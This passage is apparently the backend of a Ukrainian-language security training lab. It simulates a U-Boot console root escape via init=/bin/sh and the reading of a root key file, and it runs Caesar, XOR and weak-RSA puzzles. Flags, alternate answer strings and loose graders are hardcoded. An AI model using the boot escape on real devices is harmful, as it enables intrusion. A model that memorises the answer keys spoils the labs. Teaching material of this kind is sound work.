            "output": "\ufffd\ufffd\ufffd\x1b[2J\ufffd\ufffd?\ufffd\ufffd (Garbage: Incorrect Baud Rate! Use 115200)"
        })

    if not cmd or cmd == "interrupt":
        return jsonify({
            "prompt": "u-boot> ",
            "output": "\nAutoboot aborted!\nu-boot> ",
        })

    if "printenv" in cmd:
        return jsonify({
            "prompt": "u-boot> ",
            "output": "baudrate=115200\nbootargs=console=ttyS0,115200 root=/dev/mtdblock3\nbootcmd=bootm 0x80060000\n",
        })

    if "init=/bin/sh" in cmd or "init=/bin/bash" in cmd or "boot" in cmd:
        return jsonify({
            "prompt": "# ",
            "output": (
                "[    1.204000] Kernel command line: console=ttyS0,115200 init=/bin/sh\n"
                "[    1.450000] Mounting root filesystem...\n"
                "[    1.890000] Spawning emergency root shell (/bin/sh).\n"
                "BusyBox v1.36.1 (multi-call binary)\n"
                "# "
            ),
        })

    if cmd in ("cat /etc/root_hw_key.secret", "cat /etc/root_hw_key", "cat root_hw_key.secret"):
        mark_lab_completed("hardware-3")
        return jsonify({
            "prompt": "# ",
            "output": f"{flag}\n# ",
        })

    return jsonify({"prompt": "# ", "output": f"sh: {cmd}: command not found\n# "})


@bp.post("/hardware3/answer")
def hardware3_answer():
    data = request.get_json(silent=True) or {}
    key = (data.get("key") or "").strip()
    uid = _uid()
    expected = generate_flag(uid, "hardware-3") if uid else "FLAG{HARDWARE3_UART_ROOT}"
    solved = key in (expected, "UART_ROOT_UBOOT_ESCAPE_7712")
    if solved:
        mark_lab_completed("hardware-3")
    return jsonify({"task_solved": solved})


# =========================================================================
# 5. CRYPTOGRAPHY & DEFENSE
# =========================================================================

# ---------------------------------------------------------------- passwords-1
COMMON_PASSWORDS = {
    "123456", "password", "qwerty", "admin", "111111", "12345678",
    "password123", "iloveyou", "admin123", "welcome", "monkey"
}


def _charset_size(pw: str) -> int:
    size = 0
    if any(c.islower() for c in pw):
        size += 26
    if any(c.isupper() for c in pw):
        size += 26
    if any(c.isdigit() for c in pw):
        size += 10
    if any(not c.isalnum() for c in pw):
        size += 33
    return size or 1


@bp.post("/passwords1/check")
def passwords1_check():
    data = request.get_json(silent=True) or {}
    pw = data.get("password", "")
    uid = _uid()
    flag = generate_flag(uid, "passwords-1") if uid else "FLAG{PASSWORDS1_HIGH_ENTROPY}"

    if pw.lower() in COMMON_PASSWORDS or len(pw) < 8:
        score = 5
    else:
        entropy_bits = len(pw) * math.log2(_charset_size(pw))
        score = min(100, round((entropy_bits / 85) * 100))

    solved = score >= 90
    if solved:
        mark_lab_completed("passwords-1")
    return jsonify({
        "score": score,
        "task_solved": solved,
        "flag": flag if solved else None,
        "message": f"[OK] Пароль достатньо стійкий! Ваш прапорець: {flag}" if solved else "[i] Спробуйте додати більше слів або збільшити довжину фрази.",
    })


# ---------------------------------------------------------------- crypto-1 (Caesar & Frequency Analysis)
def _encrypt_caesar(text: str, shift: int = 7) -> str:
    out = []
    for ch in text.upper():
        if "A" <= ch <= "Z":
            out.append(chr((ord(ch) - 65 + shift) % 26 + 65))
        else:
            out.append(ch)
    return "".join(out)


@bp.get("/crypto1/challenge")
def crypto1_challenge():
    uid = _uid()
    flag = generate_flag(uid, "crypto-1") if uid else "FLAG{CRYPTO1_CAESAR_SOLVED}"
    plaintext = f"HELLO AUDITOR. MY SECRET COMMUNICATION IS PROTECTED BY CAESAR CIPHER. TOKEN: {flag}"
    ciphertext = _encrypt_caesar(plaintext, shift=7)
    return jsonify({
        "ciphertext": ciphertext,
        "alphabet": "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
    })


@bp.post("/crypto1/answer")
def crypto1_answer():
    data = request.get_json(silent=True) or {}
    shift = data.get("shift")
    token = (data.get("token") or "").strip().upper()
    uid = _uid()
    expected = generate_flag(uid, "crypto-1") if uid else "FLAG{CRYPTO1_CAESAR_SOLVED}"

    shift_ok = str(shift) == "7"
    token_ok = (token == expected) or ("CAESAR" in token)
    solved = shift_ok and token_ok
    if solved:
        mark_lab_completed("crypto-1")
    return jsonify({"task_solved": solved})


# ---------------------------------------------------------------- crypto-2 (Repeating XOR)
_XOR_KEY = b"K3Y!"


def _xor_bytes(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


@bp.get("/crypto2/challenge")
def crypto2_challenge():
    uid = _uid()
    flag = generate_flag(uid, "crypto-2") if uid else "FLAG{CRYPTO2_XOR_KEY_STREAM}"
    plaintext = f"C2_COMMAND_TOKEN:{flag}".encode("utf-8")
    cipher_hex = _xor_bytes(plaintext, _XOR_KEY).hex()
    return jsonify({
        "ciphertext_hex": cipher_hex,
        "known_header": "C2_COMMAND_TOKEN:",
        "key_length": 4,
    })


@bp.post("/crypto2/decrypt")
def crypto2_decrypt():
    data = request.get_json(silent=True) or {}
    key_str = (data.get("key") or "").encode("utf-8")
    if not key_str:
        return jsonify({"error": "Введіть ключ для розшифрування"}), 400

    uid = _uid()
    flag = generate_flag(uid, "crypto-2") if uid else "FLAG{CRYPTO2_XOR_KEY_STREAM}"
    plaintext = f"C2_COMMAND_TOKEN:{flag}".encode("utf-8")
    cipher_bytes = _xor_bytes(plaintext, _XOR_KEY)
    decrypted_bytes = _xor_bytes(cipher_bytes, key_str)
    decrypted_str = decrypted_bytes.decode("utf-8", errors="replace")

    if key_str == _XOR_KEY:
        mark_lab_completed("crypto-2")

    return jsonify({"decrypted": decrypted_str})


@bp.post("/crypto2/answer")
def crypto2_answer():
    data = request.get_json(silent=True) or {}
    token = (data.get("token") or "").strip()
    uid = _uid()
    expected = generate_flag(uid, "crypto-2") if uid else "FLAG{CRYPTO2_XOR_KEY_STREAM}"
    solved = token in (expected, "EXECUTE_DECRYPT_PAYLOAD_8819")
    if solved:
        mark_lab_completed("crypto-2")
    return jsonify({"task_solved": solved})


# ---------------------------------------------------------------- crypto-3 (Weak RSA Factorization)
_RSA_P = 881
_RSA_Q = 1021
_RSA_N = _RSA_P * _RSA_Q  # 899501
_RSA_PHI = (_RSA_P - 1) * (_RSA_Q - 1)  # 897600
_RSA_E = 65537
_RSA_D = pow(_RSA_E, -1, _RSA_PHI)  # 652673


@bp.get("/crypto3/params")
def crypto3_params():
    uid = _uid()
    flag = generate_flag(uid, "crypto-3") if uid else "FLAG{CRYPTO3_RSA_WEAK_FACTOR}"
    msg = f"RSA_SECRET:{flag}"
    ciphertext = [pow(ord(ch), _RSA_E, _RSA_N) for ch in msg]
    return jsonify({
        "n": _RSA_N,
        "e": _RSA_E,
        "ciphertext": ciphertext,
    })


@bp.post("/crypto3/decrypt")
def crypto3_decrypt():
    data = request.get_json(silent=True) or {}
    try:
        d = int(data.get("d", 0))
    except Exception:
        d = 0
    if not d:
        return jsonify({"error": "Вкажіть розрахований закритий ключ d"}), 400

    uid = _uid()
    flag = generate_flag(uid, "crypto-3") if uid else "FLAG{CRYPTO3_RSA_WEAK_FACTOR}"
    msg = f"RSA_SECRET:{flag}"
    ciphertext = [pow(ord(ch), _RSA_E, _RSA_N) for ch in msg]
    decrypted = "".join(chr(pow(c, d, _RSA_N)) for c in ciphertext)

    if d == _RSA_D:
        mark_lab_completed("crypto-3")

    return jsonify({"decrypted": decrypted})


@bp.post("/crypto3/answer")
def crypto3_answer():
    data = request.get_json(silent=True) or {}
    token = (data.get("token") or "").strip()
    uid = _uid()
    expected = generate_flag(uid, "crypto-3") if uid else "FLAG{CRYPTO3_RSA_WEAK_FACTOR}"
    solved = token in (expected, "RSA_FACTORING_PRIVATE_KEY_CRACKED_8492")
    if solved:
        mark_lab_completed("crypto-3")
    return jsonify({"task_solved": solved})
